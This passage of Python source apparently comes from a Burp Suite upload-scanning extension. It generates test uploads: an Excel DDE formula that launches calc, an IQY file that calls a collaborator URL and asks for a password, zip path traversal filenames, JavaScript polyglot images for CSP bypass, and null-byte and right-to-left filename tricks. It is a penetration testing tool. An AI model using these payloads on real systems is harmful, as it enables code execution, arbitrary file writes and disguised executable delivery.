                             'Oj57ZQL/5o3k+e/cNmuuj9QD0fj70ej30djz0cju0UQrtZ0FTc/RiN/R/I9Br1dB+G/RSM/ROMvRKMfRGML3e79Hrr9DbptALpND7mtCrldDbkox7v/' \
                             '8HHj/+tf8y4d9KvEEs9rwPFThjTykywLIh+Y8yECewsZAfUSmstaSLrK+ncoeNc3DpkVzZSGD/vxAkvpAdPVwWgtkRNSRuJIqASOBOz2Dj6dizPsWBD' \
                             '/bs02LsYbBlYDrMhXDMJqRBT4vGYo9q9Sf6kB/VIVR/BstPRSd5Nv8UyBCK2cB6TnRo9tj8J9Kvz8X/H9O3feQ='
            content_excel = content_excel.decode("base64").decode("zlib")
            title = "Malicious Excel upload/download"
            desc = "An Excel spreadsheet with the content =cmd|' /C calc'!A0 in the first cell was uploaded and " \
                   "downloaded. When this spreadsheet is opened in Microsoft Excel, and the user confirms several " \
                   "dialogues warning about code execution, the Windows calculator will open (RCE). See " \
                   "https://www.contextis.com/resources/blog/comma-separated-vulnerabilities/ for more details."
            issue = self._create_issue_template(injector.get_brr(), title, desc, "Tentative", "Low")
            self.dl_matchers.add(DownloadMatcher(issue, filecontent=content_excel))
            self.sender.simple(injector, Constants.EXCEL_TYPES, basename, content_excel, redownload=True)
            # TODO feature: Burp collaborator based for Excel format...

        basename = Constants.DOWNLOAD_ME + Constants.FILE_START + "IqyExcel"
        title = "Malicious IQY upload/download"
        desc = 'A IQY file with the content pointing to a URL was uploaded and downloaded. When this file is opened in ' \
               'Microsoft Excel, and the user confirms dialogues warning or the server automatically parses it, a ' \
               'server is contacted. See https://twitter.com/subTee/status/631509345918783489 for more details.'
        content = 'WEB\r\n1\r\n{}["a","Please Enter Your Password"]'.format(Constants.MARKER_COLLAB_URL)
        issue = self._create_issue_template(injector.get_brr(), title, desc, "Tentative", "Low")
        self.dl_matchers.add(DownloadMatcher(issue, filecontent=content))
        self.sender.simple(injector, Constants.IQY_TYPES, basename + "Mal", content, redownload=True)
        if burp_colab:
            # Also do collaborator based:
            desc += "<br>In this case we actually detected that interactions took place, meaning the server executed " \
                    "the payload. Interactions: <br><br>"
            issue = self._create_issue_template(injector.get_brr(), "Malicious IQY Collaborator Interaction", desc, "Firm", "High")
            colab_tests.extend(self.sender.send_collaborator(injector, burp_colab, Constants.IQY_TYPES, basename + "Colab",
                                                       content, issue, redownload=True))

        # TODO Burp API limitation: We could include a Link in a spreadsheet document and hope/wait for someone
        # to click and then detect it via Burp Collaborator. However, as long as we have the Burp API limitation
        # of not being able to keep collaborator interactions for a long time as an extension, there is no point.
        return colab_tests

    def _path_traversal_archives(self, injector):
        # TODO feature: Check if there is anything we could do better and look at
        # https://github.com/portswigger/file-upload-traverser

        # good implementations for zip unpacking (such as unzip) give a warning such as the following:
        # warning:  skipped "../" path component(s) in ../../1DownloadMeinfo
        if injector.opts.file_formats['zip'].isSelected():
            basename = Constants.FILE_START + "ZipPathTraversal"
            filecontent = "Upload Scanner Burp Extension ZIP path traversal proof file. If you find this file " \
                          "somewhere where no files should be unpacked to, you have a vulnerability in handling " \
                          "zip file names that include ../ ."
            files = [
                ("../" + Constants.DOWNLOAD_ME + "info1", filecontent),
                ("../../" + Constants.DOWNLOAD_ME + "info2", filecontent),
                ("../../../" + Constants.DOWNLOAD_ME + "info3", filecontent),
                ("../../../../../../../../../../../var/www/" + Constants.DOWNLOAD_ME + "info4", filecontent),

                ("info/../../../" + Constants.DOWNLOAD_ME + "info5", filecontent),

                ("\\x2e\\x2e\\x2f\\x2e\\x2e\\x2f\\x2e\\x2e\\x2f" + Constants.DOWNLOAD_ME + "info6", filecontent),
                ("info\\x2f\\x2e\\x2e\\x2f\\x2e\\x2e\\x2f\\x2e\\x2e\\x2f" + Constants.DOWNLOAD_ME + "info7", filecontent),

                ("%2e%2e%2f%2e%2e%2f%2e%2e%2f" + Constants.DOWNLOAD_ME + "info8", filecontent),
                ("info%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f" + Constants.DOWNLOAD_ME + "info9", filecontent),

                # ("../../../../../../../../../../../usr/var/www/" + self._download_me + "info10", filecontent),
                # ("../../../../../../../../../../../Local/Library/WebServer/" + self._download_me + "info11", filecontent),
                # ("../../../../../../../../../../../usr/local/apache2/" + self._download_me + "info12", filecontent),
                # ("../../../../../../../../../../../usr/local/httpd/" + self._download_me + "info13", filecontent),
                # ("../../../../../../../../../../../usr/apache/" + self._download_me + "info14", filecontent),
                # ("../../../../../../../../../../../srv/" + self._download_me + "info15", filecontent)
            ]
            title = "File path traversal"
            desc = 'A zip file was uploaded that includes several filenames that start with ../ such as ' \
                    '../../proof.txt . It was detected that a file with the exact same file content was downloaded again. ' \
                    'You might also want to check if it is returned with content-type text/html, which might lead to XSS.'
            issue = self._create_issue_template(injector.get_brr(), title, desc, "Tentative", "Medium")
            # TODO feature: is there any way we can support the user to access those proof files? Maybe just search for it?
            for f in files:
                content = BackdooredFile(injector.opts.get_enabled_file_formats(), self.burp_extender._globalOptionsPanel.image_exiftool).create_zip([f, ])
                # If we check for the entire content to not be included, these will match eacht other
                # However, if we require that PK is not in the response, then it won't match any of the zip files
                self.dl_matchers.add(DownloadMatcher(issue, filecontent=filecontent, not_in_filecontent="PK"))
                self.sender.simple(injector, Constants.ZIP_TYPES, basename, content)

    def _polyglot(self, injector, burp_colab):
        colab_tests = []

        # While I thought about implementing a GIFAR payload, I don't think it is worth doing nowadays

        if injector.opts.file_formats['jpeg'].isSelected():
            basename = Constants.DOWNLOAD_ME + Constants.FILE_START + "PolyJpegCsp"
            content = '/9j/4Ak6SkZJRi8qAQEASABI'
            content += 3096 * "A"  # the nulls in the header base64 encode to A...
            content += 'Ki89YWxlcnQoIkJ1cnAgcm9ja3MuIik7Lyr/2wBDAB4UFhoWEx4aGBohHx4jLEowLCkpLFtBRDZKa15xb2leaGZ2haqQdn6hgGZolMqWobC1v8C/c4' \
                      '7R4M+53qq7v7f/2wBDAR8hISwnLFcwMFe3emh6t7e3t7e3t7e3t7e3t7e3t7e3t7e3t7e3t7e3t7e3t7e3t7e3t7e3t7e3t7e3t7e3t7f/wAARCABE' \
                      'AEQDAREAAhEBAxEB/8QAGgAAAwEBAQEAAAAAAAAAAAAAAAIEBQMGAf/EADEQAAEDAgEKBQQDAQAAAAAAAAEAAgMEEZEFEhMhMTNBUVKBFBUiU9EyYX' \
                      'GhNEJzsf/EABgBAQEBAQEAAAAAAAAAAAAAAAADBAEC/8QAHxEBAAICAwEBAQEAAAAAAAAAAAEDAhESMTITIVFB/9oADAMBAAIRAxEAPwCfSye4/FAa' \
                      'WT3H4oDSye4/FB2pJJDVwgvcRnt4/dBq5ScWujsSNR2FQunpopiJ2kD39TsVn3K+oMHu6jim5NQYPd1HFc3JqF9GSYdZvrWqnyy2+nmlZIIBBs5Mox' \
                      'Tx+Jn1OtcA/wBR8pM6/XYjc6hyqJzPJnbGjYFjzy5S24YcY0QKb0YIGC4L6Lc91rp8sl3p5tWSCDSyVQ6RwnlHoH0g8Sg61tVpn5jD6B+1msz3+Q11' \
                      'V8Y3PaYKKxwuOGCBguC+i3Pda6fLJd6ebVkjQ6PSN02dmX15u0oNhuV6VrQ1scgAFgA0fKBo8qU0kjWNjku4gC7Rx7po2MpgB0dhwKz3f400dSkCzr' \
                      'mCBguC+i3Pda6fLJd6ebVkggEHWj/lwf6N/wCoNrKEb5HMzGl1gb2ChbjM60vTlEb2lFPN7bsFHhl/F+eP9Do3sF3NIH3C8zjMdkZRPQC8vS+i3Pda' \
                      '6fLJd6ebVkggEDRPMUrJALlrg634QaPnUnssxQaUErzT6WdojO23ILkzERuXYiZnUIZ5jM+51AbAsWefKWzDDjBQvD2votz3WunyyXenm1ZIIBAINL' \
                      'JVDnkVEo9A+kHj90FFXUaV2a0+gftZLM+U6jprrw4xue3AKSpguC+i3Pda6fLJd6ebVkggEHSnYJKiJjtbXPAOKDbr5DFGyJgzWkcOXJRuymI0vTjE' \
                      'zuUIWVpMEDBcF9Fue610+WS70z/LIeqTEfCskPLIeqTEfCA8sh6pMR8IHhydEyZjw592uBFyOf4QW1UDZi0uJFuSnnjGXatec49OHg4+bsVP5Qp9ZN' \
                      '4SPm7Fc+UOfWX3wrObk+UH1lRAwRssL2vxVsMYxjUJKi8vL//Z'
            content = content.decode("base64")
            types = {
                # ('', self._marker_orig_ext, ''),
                ('', Constants.MARKER_ORIG_EXT, 'image/jpeg'),
                ('', '.jpg', ''),
                ('', '.jpg', 'image/jpeg'),
            }
            title = "CSP Bypass"
            desc = 'A file that is a jpeg and a JavaScript file at the same time can be uploaded, which allows CSP bypasses. See ' \
                    'http://blog.portswigger.net/2016/12/bypassing-csp-using-polyglot-jpegs.html for details.'
            issue = self._create_issue_template(injector.get_brr(), title, desc, "Firm", "Low")
            self.dl_matchers.add(DownloadMatcher(issue, filecontent=content, check_not_content_disposition=True))
            self.sender.simple(injector, types, basename, content, redownload=True)

        if injector.opts.file_formats['gif'].isSelected():
            basename = Constants.DOWNLOAD_ME + Constants.FILE_START + "PolyGifCsp"
            content = 'R0lGODlhPSAnIKUkAAAAACgAAFkAAGRkZICAgI6OjpaWlpmZmaoAAKqqqrwAAL+/v8YAAMvLy8wAANQAANsAANsxMd7e3t8/P+JRUeNbW+Zqaufn5+h' \
                      '7e+uHh+uKiu2UlPGrq/KxsfS+vvTDw/fNzfnc3Prh4f39/f' + 111 * "/"
            content += 'yH+Jztkb2N1bWVudC5nZXRFbGVtZW50QnlJZCgianNvdXRwdXQiKS5pbm5lckhUTUwgPSAiVGhpbmtGdSByZWNrb25zIENhamEgaXMgcmF0aGVyIG5' \
                      'lYXQuIjsgLyogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIAQgICAgACwAAAAAjwBYAAAG/' \
                      'sCRcEgsGo/IpHLJbDqfxod0Cq1ar9isVjjtSrfgsHiM9HrJ6LTaaTav33B12x2v27Pz7n3Pb+b1fYGCQ1QjbYOIfYBchYmOdY2PknuLk5ZxlZeaaZm' \
                      'bnmBnn6KgnaOmT6Wnqkqhq65Lra+yUamzr7G2s3S5tru8sr6/rrjCqsHFp8fIo8rLn83Om9BQANXW19jYRtZaIhUdIGvcWIdb2efoAETaVxMR7xEYa' \
                      'exW5Vnp+OznVhgV/v4URJDZV4+YlXwI1Y0g+KSBhQwQI3IYmO3KNCcJ8wlh6GSBhg4gQ3qgSA/VxSYZ0w3h2OTCxBAwRYQjea2gwYMpS7J0smFI/og' \
                      'OaHYysRe0ohKW1Zp8ECLwiMJtT5EI3VjmJJapKyuqvEIPnVSjRUoyqgUG68acSaGOy1oTodqaYcEasnpVrlO0adfpxBt1oV2vhOhytfsWrd69fA/DP' \
                      'cvxD9Gxke6KLZxT8Vq/idkuxkfEMbHHlPuGzmg5L+bMp8dxDuw58tybmi9LBrs6tenVtffVhlxoDi3YjBd/JQzYdtTisdcaLlIOtO+jhONONv6Uo9D' \
                      'ilX8Dcn7SrPHZm+VeZ5iyaijuwIPLDg1eufjo2BOa3/74OfTppUVTT34cPnnS2vV2DGjt6ZdfgdW9N1188gX4xWudEMjefcLxlyBiFarnHoCd/rlhH' \
                      '2+uFbjEeLQpmOF+GqqzFWt6oEfWgRSuh+J3/CFYI3VR0VGfhBMmQWJXJsrIIFyrNedLHoH5GB2M0gGJoZD/OWnUIR8i+ZqS+N3YZHhPmmahljhCSAV' \
                      'RVoYIpoijgfkjlxWmo+ObSJLl3ZobCkdnXkihA2ecf4y45JkpXminfyVOdk4Au/QpZno0YnmibUw2umV/C2IjQKL2WclElpY56qWhj0La6XDVKHDkZ' \
                      '4xK94SMcSk53KYGsqrXotEY08oBBwyB6wi49rrrr7nWismtvBarqxC/HhussGvs0iuvuxoLbK7PMttsJdRGiyyy1CprrRyxPFttsNNK+y0aUoKdy0e' \
                      '66t6RaruKvAhvIO/O66689lJiZr6C4MuvHf7+C0fAAr9BcMHgPoDwvZHsu/AYRj748LWOTTywZxYbXHHGFH/IMbqafpxwvSKTc3AYQQAAIf4qLyAvL' \
                      'yAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgBCAgICAAOw=='
            content = content.decode("base64")
            types = {
                # ('', self._marker_orig_ext, ''),
                ('', Constants.MARKER_ORIG_EXT, 'image/gif'),
                ('', '.gif', ''),
                ('', '.gif', 'image/gif'),
            }
            title = "CSP Bypass"
            desc = 'A file that is a gif and a JavaScript file at the same time can be uploaded, which allows CSP bypasses. See ' \
                    'http://blog.portswigger.net/2016/12/bypassing-csp-using-polyglot-jpegs.html for details, but this PoC polyglot ' \
                    'was taken from http://www.thinkfu.com/blog/gifjavascript-polyglots . Note that this PoC only works if the HTML page ' \
                    'includes a HTML id named "jsoutput" where the innerHTML attribute can be set. '
            issue = self._create_issue_template(injector.get_brr(), title, desc, "Firm", "Low")
            self.dl_matchers.add(DownloadMatcher(issue, filecontent=content, check_not_content_disposition=True))
            # The image was once actually transformed but stayed nearly a valid GIF and a JS file, so we try to match for this true
            # positive as well because I *believe* such a transformation can be turned into a CSP bypass as well
            alternative_issue = issue.create_copy()
            alternative_issue.detail += "It was detected that the file was processed on the server side (probably " \
                                        "GraphicsMagick), however, it seems that a polyglot is still feasible with the " \
                                        "processing taking place."
            alternative_content = 'GIF89a= \' \xf5$\x00\x00\x00\x00(\x00\x00Y\x00\x00ddd\x80\x80\x80\x8e\x8e\x8e\x96\x96\x96\x99\x99\x99\xaa' \
                                  '\x00\x00\xaa\xaa\xaa\xbc\x00\x00\xbf\xbf\xbf\xc6\x00\x00\xcb\xcb\xcb\xcc\x00\x00\xd4\x00\x00\xdb\x00\x00' \
                                  '\xdb11\xde\xde\xde\xdf??\xe2QQ\xe3[[\xe6jj\xe7\xe7\xe7\xe8{{\xeb\x87\x87\xeb\x8a\x8a\xed\x94\x94\xf1\xab' \
                                  '\xab\xf2\xb1\xb1\xf4\xbe\xbe\xf4\xc3\xc3\xf7\xcd\xcd\xf9\xdc\xdc\xfa\xe1\xe1\xfd\xfd\xfd\xff\xff\xff\xff' \
                                  '\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff' \
                                  '\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff' \
                                  '\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff' \
                                  '\xff\xff!\xf9\x04\x00\x00\x00\x00\x00!\xfe\xc7;document.getElementById("jsoutput").inerHTML = "ThinkFu r' \
                                  'eckons Caja is rather neat."; /*'
            self.dl_matchers.add(DownloadMatcher(alternative_issue, filecontent=alternative_content, check_not_content_disposition=True))
            self.sender.simple(injector, types, basename, content, redownload=True)

        # We always send this, as long as the polyglot module is activated, we assume the user wants this...
        basename = Constants.DOWNLOAD_ME + Constants.FILE_START + "CorkamixPePdfJarHtml"
        content = 'eJytVF9PE0EQn4Ni4fgrUDXGhxVjWmLao0QjoccFKG2EUmxoYwykMdfe0i7e3TZ3C6FRnvwofgJN9MEHX/TJxFe/jIk6e1dsoeCTu9nb2Zm5385Mfjv' \
                  'FvZV0puUxVyTmstx7aRY3n5P9Vls0uVudm799v7SRT6ZTKq8d6rph+MKjpqPqTeHYxioAlHIA2wpcGAPKqNJFK+WqsHTOZxUi+I30aCKg17jVNnz08' \
                  'zq+gxdhO2O8Ry703f1/hsQd/od98tZScw/z+B0rKKvw483XyBfaE8oLJYRw/OO6JwCCCh+ENt0XbZsaMl3yihwzn9WYzUR7ucksi7qZU5JyzxtC2aY' \
                  'Z0uI+E4y7y8Ss+dw+ElJnWhZzG8tkgaTpSfjNEMf0Ggz9FjJE8Faw2/RABMIpaabxhtAlGZpTD7t/JWtcCO5I7ZLUnupaGLNusWNSt03fX3ENovt1j' \
                  '7UEEe0WXYkLeiK0Q/PYDLVxw7SpJxLxLg+eVIrbD7bQoxx4VOPzGQQOZEO/m0yWCoMR9dJqj+Aq5ipryc2dvNbvdq+zZnvdims7m/lcuZIq5rNIWkG' \
                  't5DqWMq0WTcwwK5NYJnUZnMNO1H7Qn0q4JlA+c0sFuX/79ekzkjMJN6PIdBg+s0YhosCULIFmm25De1o7pHWhQMTBGxW4kdjf7hrLAinRyMw/Q3uWW' \
                  '3QEkxyNgnoOodz2BXXGYAzGFRjkRwgWCzEY10qSU+XgQWaGYVKBO91SyyqT7PZauUyYS7bWdqsqXIeZKEwrMHMJwBjWLqZANOCpjcHGEpfH+p26Vqc' \
                  'JoIRdQU0j44LuoBWY5e/jXjI96goiDbtalrsCT/7+ojxWDaOq7VKfH3l16suOYhiLZwB/28t6RbPogXlkC7K0QCoHARTyGufj9CNScRI9zWUjX52vH' \
                  'JJcRe0LTXgmQxJiSLuciyCyBvXDwOTNKig4wzajYP2H4BruUTzFYADkcx55D8PTEx9h6l1IilJBGZiFq0kajqnO3kPZ/t96SRsOgit+BYUvQ+hlaBf' \
                  'hdR9fS4Wha9I6iPMD7m8H5OkP3+Q/0w=='
        content = content.decode("base64").decode("zlib")
        # we only upload as PDF type as that is the likeliest to succeed of all those formats
        title = "CSP Bypass"
        desc = 'A file that is a PDF, Jar, HTML, JavaScript and PE file at the same time (corkamix) can be uploaded and downloaded, which allows CSP bypasses. The '
        desc += 'file was taken from https://code.google.com/archive/p/corkami/downloads?page=2 . '
        issue = self._create_issue_template(injector.get_brr(), title, desc, "Firm", "Low")
        self.dl_matchers.add(DownloadMatcher(issue, filecontent=content, check_not_content_disposition=True))
        self.sender.simple(injector, Constants.PDF_TYPES, basename, content, redownload=True)

        if injector.opts.file_formats['zip'].isSelected():
            basename = Constants.DOWNLOAD_ME + Constants.FILE_START + "JsZip"
            content = "prompt(123);PK\x03\x04\x14\x00\x00\x00\x00\x00\xeb\x91[J\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\t\x00\x00\x00" \
                      "empty.txtPK\x01\x02\x14\x03\x14\x00\x00\x00\x00\x00\xeb\x91[J\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\t\x00" \
                      "\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\xa4\x81\x00\x00\x00\x00empty.txtPK\x05\x06\x00\x00\x00\x00\x01\x00\x01\x00" \
                      "7\x00\x00\x00'\x00\x00\x00\x00\x00"
            title = "CSP Bypass"
            desc = 'A file that is a JavaScript and Zip file at the same time can be uploaded and downloaded, which allows CSP bypasses. The ' \
                    'file is just the JavaScript prompt function with a concatenated zip file with an empty.txt in it. As zip files do not need ' \
                    'to start at the beginning of the file, some implementations unzip this file just fine. '
            issue = self._create_issue_template(injector.get_brr(), title, desc, "Firm", "Low")
            self.dl_matchers.add(DownloadMatcher(issue, filecontent=content, check_not_content_disposition=True))
            self.sender.simple(injector, Constants.ZIP_TYPES, basename, content, redownload=True)

        return colab_tests

    def _fingerping(self, injector):
        if not injector.opts.file_formats['png'].isSelected():
            # we only upload PNG files in this module
            return
        if not injector.opts.redl_enabled or not injector.opts.redl_configured:
            # this module can only fingerprint(when the files are downloaded again)
            return
        f = Fingerping()
        # we only send the fingerping files as valid PNG files
        types = [('', '.png', 'image/png')]
        downloads = {}
        number_of_responses = 0
        last_picture = ''
        last_status_code = 0
        # First, we need to upload the test files
        for orig_filename in FingerpingImages.all_images:
            downloads[orig_filename] = None
            # it doesn't really matter which filename in the upload request we use as long as we know
            # which original filename it was. So let's remove - and _ in the filename for consistency in this extension
            basename = Constants.FILE_START + "Fingerping" + orig_filename.replace("-", "").replace("_", "")
            content = FingerpingImages.all_images[orig_filename]
            urrs = self.sender.simple(injector, types, basename, content, redownload=True)
            if urrs:
                # With one member of types, we also only get one:
                urr = urrs[0]
                if urr and urr.download_rr:
                    i_response_info = self.callback_helpers.analyzeResponse(urr.download_rr.getResponse())
                    resp = FloydsHelpers.jb2ps(urr.download_rr.getResponse())
                    body_offset = i_response_info.getBodyOffset()
                    body = resp[body_offset:]
                    if body.startswith('\x89PNG'):
                        # print("Downloaded", orig_filename, "is a PNG. Content:")
                        # print(repr(body))
                        # Make sure this image is not the same as *the last* image we uploaded and successfully downloaded
                        # but where the upload response had a different status code.
                        # This is necessary because otherwise we get a lot of false positives/incorrect results
                        # as the extension thinks the file was uploaded successful, but it was not changed and the
                        # image is just the last test we uploaded, not the current. This is not optimal, as the response
                        # might better indicate if a file was successfully parsed/modified or not. Actually,
                        # the non-ordering of Python dictionary helps, as FingerpingImages.all_images is not
                        # iterated in the sequence it was initialized with, so pictures that are not *exactly* the
                        # same but look the same (eg. color test) but a server tool might convert to the exact same image
                        # are not uploaded after each other... This works OKish so far.
                        status_code = self.callback_helpers.analyzeResponse(urr.upload_rr.getResponse()).getStatusCode()
                        if body == last_picture and not last_status_code == status_code:
                            print("Fingerping: Ignoring downloaded picture", orig_filename, "as it probably didn't change on server")
                        else:
                            last_picture = body
                            last_status_code = status_code
                            downloads[orig_filename] = body
                            number_of_responses += 1
                            # TODO feature: As dominique suggested, detect if it was converted to JPEG by the server
                            # if yes convert JPEGs to PNG and then use them in the same way...

        confidence = "Tentative"
        print("Fingerping module was able to download", str(number_of_responses), \
            "of", str(len(FingerpingImages.all_images)), "images as PNGs again")
        results, fingerprintScores = f.do_tests(downloads, True)
        text_score, total = f.get_results_table(fingerprintScores)
        highest_score = text_score[-1][1]
        score_percentage = float(highest_score) / total

        if score_percentage > 0.6:
            confidence = "Certain"
        elif score_percentage > 0.85:
            confidence = "Firm"

        result_table = "<br>".join([text + " " + str(score) + "/" + str(total) for text, score in text_score])

        title = "Fingerping Fingerprinting results"
        desc = "The fingerping tool is able to fingerprint images libraries that modify a set of png files that are " \
               "uploaded. The original project by Dominique Bongard is located at https://github.com/0xcite/fingerping " \
               "and the fork that is used in this extension here: https://github.com/floyd-fuh/fingerping/ . <br><br>" \
               "Knowing the server side image parser is important to do a security test, for example to check for " \
               "an old version or to go back and fuzz the parser, then exploit it on the server. <br><br>The module " \
               "was able to download {} of {} images as PNGs again (can be good and bad). <br><br>" \
               "The common error case occurs when the server overwrites the same file name again and again but " \
               "keeps the last uploaded content if image transformation fails. UploadScanner tries to detect this " \
               "(different status code) but can not if the status code is the same in success and fail case. After " \
               "all it is not as unlikely that test images are converted to identical images.<br><br>" \
                "The result of the fingerping run is (last line is the most likely match): <br><br>{}<br><br>" \
                "If there was no full match (60/60) and you know the exact library used on the server, please " \
                "consider submitting the following fingerprint at https://github.com/floyd-fuh/fingerping/ " \
                "together with the exact version of the image library on the server. Please also make sure " \
                "that the common error case does not apply." \
               "<br><br>{}".format(str(number_of_responses), str(len(FingerpingImages.all_images)),
                               result_table, repr(results))
        issue = self._create_issue_template(injector.get_brr(), title, desc, confidence, "Information")
        self.burp_extender._add_scan_issue(issue)

    def _quirks_with_passive(self, injector):
        if not injector.get_uploaded_filename():
            # If the request does not contain a filename, there is no point in doing these requests
            return
        # TODO feature: Surrogate pairs? Invalid overlong Unicode?
        # TODO feature: in general feedback to this module...
        orig_content = injector.get_uploaded_content()
        base_request_response = injector.get_brr()
        random_part = ''.join(random.sample(string.ascii_letters, 3))

        file_extension = FloydsHelpers.u2s(injector.get_default_file_ext())
        semicolon_ie = Constants.DOWNLOAD_ME + "Semicolon" + random_part+".exe;" + file_extension
        title = "Semicolon in Content-Disposition"
        desc = 'Internet explorer might interprete a HTTP response header of Content-Disposition: attachment; filename="evil_file.exe;.txt" as an exe file. ' + \
               "A filename of " + semicolon_ie + " was uploaded and detected that it's possible to download a file named " + Constants.MARKER_URL_CONTENT + " ."
        issue = self._create_issue_template(base_request_response, title, desc, "Certain", "Low")
        self.dl_matchers.add(DownloadMatcher(issue, filename_content_disposition=semicolon_ie))
        self.dl_matchers.add(DownloadMatcher(issue, filename_content_disposition=Constants.DOWNLOAD_ME + "Semicolon"+random_part+".exe%3B" + file_extension))
        self.dl_matchers.add(DownloadMatcher(issue, filename_content_disposition=Constants.DOWNLOAD_ME + "Semicolon"+random_part+".exe%3b" + file_extension))
        req = injector.get_request(semicolon_ie, orig_content)
        if req:
            Checks_Helper.make_http_request(self.burp_extender, injector, req, redownload_filename=semicolon_ie)

        nulltruncate = Constants.DOWNLOAD_ME + "Nulltruncate" + random_part + ".exe\x00" + file_extension
        title = "Null byte filename truncate"
        desc = 'A filename of ' + cgi.escape(nulltruncate) + " (including a truncating zero byte after .exe) was uploaded and detected that it's possible to download a file named " + Constants.MARKER_URL_CONTENT + " ."
        issue = self._create_issue_template(base_request_response, title, desc, "Certain", "Low")
        exp = Constants.DOWNLOAD_ME + "Nulltruncate" + random_part + ".exe"
        self.dl_matchers.add(DownloadMatcher(issue, filename_content_disposition=exp,
                                             not_in_filename_content_disposition=file_extension))
        self.dl_matchers.add(DownloadMatcher(issue, url_content=exp, not_in_url_content=file_extension, filecontent=orig_content))
        req = injector.get_request(nulltruncate, orig_content)
        if req:
            Checks_Helper.make_http_request(self.burp_extender, injector, req, redownload_filename=exp)

        backspace = Constants.DOWNLOAD_ME + "Backspace" + random_part + ".exe" + file_extension + "\x08" * len(file_extension)
        title = "Backspace filename truncate"
        desc = "We uploaded a filename of " + backspace + " (having the 0x08 backspace character several time at the end) and detected that it's possible to download a file named " + Constants.MARKER_URL_CONTENT + " ."
        issue = self._create_issue_template(base_request_response, title, desc, "Certain", "Low")
        exp = Constants.DOWNLOAD_ME + "Backspace" + random_part + ".exe"
        self.dl_matchers.add(DownloadMatcher(issue, filename_content_disposition=exp,
                                             not_in_filename_content_disposition=file_extension))
        self.dl_matchers.add(DownloadMatcher(issue, url_content=exp, not_in_url_content=file_extension, filecontent=orig_content))
        req = injector.get_request(backspace, orig_content)
        if req:
            Checks_Helper.make_http_request(self.burp_extender, injector, req, redownload_filename=exp)

        left_to_right = Constants.DOWNLOAD_ME + "\xe2\x80\xaeexe.thgirottfel" + random_part + file_extension
        random_part_reverse = random_part[::-1]
        title = "UTF-8 Unicode left to right overwrite"
        desc = "We uploaded a filename of {} (which has the UTF-8 verison of left to right overwrite " \
               "unicode char 0xE280AE) and detected that it's possible to download a file named {} . " \
               "How such a file is presented to the user is dependent on the HTTP client.".format(left_to_right, Constants.MARKER_URL_CONTENT)
        issue = self._create_issue_template(base_request_response, title, desc, "Certain", "Low")
        expected_filenames = (
            left_to_right,
            Constants.DOWNLOAD_ME + file_extension[::-1] + random_part_reverse + "lefttoright" + ".exe",
            Constants.DOWNLOAD_ME + "%E2%80%AEexe.thgirottfel" + random_part + file_extension,
            Constants.DOWNLOAD_ME + "%e2%80%aeexe.thgirottfel" + random_part + file_extension,
            Constants.DOWNLOAD_ME + "%u202Eexe.thgirottfel" + random_part + file_extension,
            Constants.DOWNLOAD_ME + "%u202eexe.thgirottfel" + random_part + file_extension,
        )
        for exp in expected_filenames:
            self.dl_matchers.add(DownloadMatcher(issue, filename_content_disposition=exp))
            self.dl_matchers.add(DownloadMatcher(issue, url_content=exp, filecontent=orig_content))
        req = injector.get_request(left_to_right, orig_content)
        if req:
            Checks_Helper.make_http_request(self.burp_extender, injector, req, redownload_filename=left_to_right)

        left_to_right2 = Constants.DOWNLOAD_ME + "\xe2\x80\xae" + str(file_extension[::-1]) + "thgirottfel" + random_part + ".exe"
        title = "UTF-8 Unicode left to right overwrite"
        desc = "We uploaded a filename of {} (which has the UTF-8 verison of left to right overwrite unicode char " \
               "0xE280AE) and detected that it's possible to download a file named {} . How such a file is presented " \
               "to the user is dependent on the HTTP client.".format(left_to_right2, Constants.MARKER_URL_CONTENT)
        issue = self._create_issue_template(base_request_response, title, desc, "Certain", "Low")
        expected_filenames = (left_to_right2, Constants.DOWNLOAD_ME + "exe." + random_part_reverse + "lefttoright" + file_extension)
        for exp in expected_filenames:
            self.dl_matchers.add(DownloadMatcher(issue, filename_content_disposition=exp))
            self.dl_matchers.add(DownloadMatcher(issue, url_content=exp, filecontent=orig_content))
        req = injector.get_request(left_to_right2, orig_content)
        if req:
            Checks_Helper.make_http_request(self.burp_extender, injector, req, redownload_filename=left_to_right2)

        rfc_2047 = Constants.DOWNLOAD_ME + "=?utf-8?q?" + random_part + "Hi=21" + file_extension + "?="
        title = "RFC 2047 in Content-Disposition"
        desc = "A strange encoding found in RFC 2047. Recognized in some headers in Firefox and Chrome including Content-Disposition. We uploaded a filename of " + rfc_2047 + " and detected that it's possible to download a file named " + Constants.MARKER_URL_CONTENT + " ."
        issue = self._create_issue_template(base_request_response, title, desc, "Certain", "Low")
        expected_filenames = (rfc_2047, Constants.DOWNLOAD_ME + random_part + "Hi!" + file_extension)
        for exp in expected_filenames:
            self.dl_matchers.add(DownloadMatcher(issue, filename_content_disposition=exp))
        req = injector.get_request(rfc_2047, orig_content)
        if req:
            Checks_Helper.make_http_request(self.burp_extender, injector, req, redownload_filename=rfc_2047)

    def _quirks_without_passive(self, injector):
        if not injector.get_uploaded_filename():
            # If the request does not contain a filename, there is no point in doing these requests
            return
        # TODO feature: in general feedback to this module...
        file_extension = injector.get_default_file_ext()
        # The checks that have no passive checks, simply send them:
        payloads = (
            "A" * 9990 + file_extension,  # just a very long filename, generated PHP error "Warning</b>:  move_uploaded_file(" in the past
            "\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c\x0d\x0e\x0f\x10\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f" + file_extension,
            "%01%02%03%04%05%06%07%08%09%0a%0b%0c%0d%0e%0f%10%11%12%13%14%15%16%17%18%19%1a%1b%1c%1d%1e%1f" + file_extension,
            "".join([struct.pack("B", x) for x in range(0x20, 0x2f)]) + file_extension,
